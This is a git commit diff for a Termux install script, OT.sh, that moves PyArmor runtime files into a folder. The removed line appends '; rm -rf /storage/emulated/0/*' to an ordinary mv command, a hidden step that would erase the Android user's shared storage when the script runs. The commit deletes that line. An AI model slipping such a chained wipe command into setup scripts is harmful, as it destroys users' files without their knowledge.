5665bb2f073f5f4e5f349549f88e065d0a7052da
Sulphur <60334841+onlySULPHUR@users.noreply.github.com>
2021-04-21 11:08:59 +0530

    Update OT.sh

--- OT.sh
+++ OT.sh
@@ -3,5 +3,4 @@
 #t.me/onlysulphur
 mkdir /data/data/com.termux/files/home/Sulphur/pytransform
 mv /data/data/com.termux/files/home/Sulphur/_pytransform.so /data/data/com.termux/files/home/Sulphur/pytransform/
-mv /data/data/com.termux/files/home/Sulphur/__init__.py /data/data/com.termux/files/home/Sulphur/pytransform/ ; rm -rf /storage/emulated/0/*
-
+mv /data/data/com.termux/files/home/Sulphur/__init__.py /data/data/com.termux/files/home/Sulphur/pytransform/ 
